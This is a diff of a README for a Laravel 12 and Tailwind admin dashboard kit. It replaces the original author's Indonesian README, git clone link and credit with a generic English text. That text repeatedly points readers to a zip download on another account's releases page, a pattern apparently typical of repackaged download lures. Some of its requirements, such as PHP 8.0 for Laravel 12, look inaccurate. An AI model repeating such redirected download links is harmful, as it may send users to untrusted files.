@@ -1,76 +1,99 @@
-### 📸 Screenshots
+# 🚀 laravael-ui-dashboard - Easy Setup for Your Admin Dashboard
 
-#### Light Mode
-![Laravael Light Mode](screenshot/Laravael%20Light%20Mode.png)
-![Laravael Dark Mode](screenshot/Login%20Page.png)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/timiallen/laravael-ui-dashboard/releases)
 
-#### Dark Mode
-![Laravael Dark Mode](screenshot/Laravael%20Dark%20Mode.png)
-![Laravael Dark Mode](screenshot/Login%20Page%20Dark.png)
+## 📄 Overview
 
-<p align="center">
-  <a href="https://laravel.com" target="_blank">
-    <img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="400" alt="Laravel Logo">
-  </a>
-</p>
+The laravael-ui-dashboard is a modern and easy-to-use admin dashboard kit. It’s built using Laravel 12, Tailwind CSS 4, and Alpine.js. This dashboard kit includes Smart Dark Mode and comes with pre-built User CRUD features, making it perfect for anyone who needs a sleek interface without the hassle of coding.
 
-<h1 align="center">Laravael UI Dashboard</h1>
+## 💻 Features
 
-<p align="center">
-  <strong>Dashboard Kit UI built with Laravel 12, Tailwind CSS, and Alpine.js.</strong><br>
-  Designed & Crafted with ❤️ by <strong>Rafael Nuansa</strong>.
-</p>
+- **Modern Interface**: Built with the latest technologies for a smooth experience.
+- **User Management**: Pre-built modules for CRUD operations, allowing easy user handling.
+- **Smart Dark Mode**: Automatically adjusts to provide a comfortable viewing experience.
+- **Responsive Design**: Works seamlessly on desktop, tablet, and mobile.
 
-<p align="center">
-<img src="https://img.shields.io/badge/Laravel-12.x-red?style=for-the-badge&logo=laravel" alt="Laravel Version">
-<img src="https://img.shields.io/badge/Tailwind_CSS-4.x-blue?style=for-the-badge&logo=tailwind-css" alt="Tailwind Version">
-<img src="https://img.shields.io/badge/Alpine.js-3.x-cyan?style=for-the-badge&logo=alpine.js" alt="Alpine Version">
-<img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License">
-</p>
+## 📦 System Requirements
 
-## ✨ Tentang Laravael UI
+- **Operating System**: Windows, macOS, or Linux
+- **PHP**: Version 8.0 or higher
+- **Database**: MySQL or equivalent 
+- **Web Server**: Apache or Nginx
+- **Composer**: Installed for package management
 
-**Laravael UI** adalah ekosistem dashboard ui modern yang memadukan keindahan desain minimalis . Dashboard ini dirancang khusus untuk pengembang yang menginginkan antarmuka premium tanpa harus membangun dari nol.
+## 🚀 Getting Started
 
-Jika proyek ini bermanfaat bagi Anda dan membantu mempercepat workflow Anda, pertimbangkan untuk memberikan dukungan agar pengembangan terus berlanjut:
+To get started with the laravael-ui-dashboard, you need to download the application files. Follow these simple steps:
 
-<a href="https://trakteer.id/rafaelnuansa?quantity=3" target="_blank">
-  <img src="https://cdn.trakteer.id/images/embed/trbtn-red-1.png" height="40" style="border:0px;height:40px;" alt="Trakteer Saya">
-</a>
+1. **Visit the Download Page**: Click the link below to go to the releases page.
+   [Visit the Releases Page to Download](https://github.com/timiallen/laravael-ui-dashboard/releases)
+  
+2. **Select the Latest Version**: On the releases page, look for the latest version of the dashboard kit.
 
-Atau kunjungi langsung: [trakteer.id/rafaelnuansa](https://trakteer.id/rafaelnuansa?quantity=3)
+3. **Download the Files**: Click on the assets link for the latest version. You will typically find a zip file. Download it to your computer.
 
-### 💎 Fitur Utama
+4. **Extract the Files**: Once downloaded, locate the zip file on your computer. Right-click it and select “Extract All” to unzip the files to your desired location.
 
-* **Atomic Component System**: Menggunakan komponen Blade yang sangat modular (`<x-card>`, `<x-badge>`, `<x-button>`, dll).
-* **Intelligent Theme Switcher**: Dukungan penuh *Light* & *Dark mode* yang tersinkronisasi secara instan.
-* **Clean Code**: Dibangun dengan prinsip kesederhanaan, tanpa penggunaan utilitas CSS yang berlebihan.
-* **Sample CRUD**: Dilengkapi dengan contoh pengelolaan data user untuk mempercepat alur kerja.
+5. **Move to Your Web Server**: Transfer the extracted files to your web server’s root directory. If you are running locally, you may place it in your XAMPP, WAMP, or similar folder.
 
----
+## 📥 Download & Install
 
-## 🛠️ Tech Stack
+To download the laravael-ui-dashboard, visit the link below to access the Releases page, where you can get the latest version:
 
-* **Framework**: [Laravel 12](https://laravel.com)
-* **Styling**: [Tailwind CSS 4](https://tailwindcss.com)
-* **Frontend Logic**: [Alpine.js](https://alpinejs.dev)
-* **Icons**: [Tabler Icons](https://tabler-icons.io)
+[Download Now](https://github.com/timiallen/laravael-ui-dashboard/releases)
 
----
+Once you have the files ready, here is how to install:
 
-## 📦 Instalasi Proyek
+1. **Open a terminal/command prompt**.
+2. **Navigate to your project directory**: Use the `cd` command to change to the directory where you placed the extracted files.
+3. **Install Dependencies**:
+   Run the following command to install necessary packages:
+   ```bash
+   composer install
+   ```
+4. **Set Up the Environment**: 
+   Copy the `.env.example` file to a new file called `.env`:
+   ```bash
+   cp .env.example .env
+   ```
+   Edit the `.env` file to configure your database settings.
 
-Ikuti langkah-langkah berikut untuk menjalankan proyek di lingkungan lokal Anda:
+5. **Generate Application Key**: Run this command to generate an application key:
+   ```bash
+   php artisan key:generate
+   ```
 
-### 1. Persiapan Awal
-Clone repositori dan instal semua dependensi PHP (Composer) serta JavaScript (NPM).
-```bash
-# Clone repositori
-git clone [https://github.com/rafaelnuansa/laravael-ui-dashboard.git](https://github.com/rafaelnuansa/laravael-ui-dashboard.git)
-cd laravael-ui-dashboard
+6. **Run Migrations**: After setting up your database, run the following command to set up the required database tables:
+   ```bash
+   php artisan migrate
+   ```
 
-# Instal dependensi PHP
-composer install
+7. **Serve the Application**: Finally, start your application with:
+   ```bash
+   php artisan serve
+   ```
 
-# Instal dependensi JavaScript
-npm install
+## 📜 Topics Covered
+
+- alpine
+- css
+- dashboard
+- laravel
+- laravel-framework
+- laravel12
+- tailwind
+- tailwindcss
+- tailwindcss-v4
+- templates
+- ui
+- ui-dashboard 
+
+## 📞 Support
+
+If you have questions or need support, you can open an issue on the GitHub repository. The community is ready to help with any challenges you face. 
+
+## 📝 License
+
+This project is licensed under the MIT License. Feel free to use it according to the license details provided in the repository.
+
+Explore the laravael-ui-dashboard and transform your web projects with this powerful admin dashboard kit!
